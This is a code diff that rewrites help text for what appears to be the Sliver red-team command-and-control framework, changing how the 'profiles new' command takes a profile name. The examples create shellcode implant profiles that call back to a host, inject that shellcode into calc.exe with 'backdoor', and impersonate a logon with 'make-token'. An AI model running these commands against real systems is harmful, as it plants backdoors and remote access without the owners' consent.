@@ -206,10 +206,10 @@ stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
 
 To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
-profiles new --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+profiles new --format shellcode --mtls 1.2.3.4 --skip-symbols windows-shellcode
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new [--profile-name] <options>
+	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new <options> <profile name>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
@@ -462,9 +462,9 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 `
 	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
-[[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
+[[.Bold]]Example:[[.Normal]] backdoor --profile z "c:\windows\system32\calc.exe"
 
-[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --profile-name whatever --http ab.cd
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --http ab.cd windows-shellcode
 `
 	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
 [[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
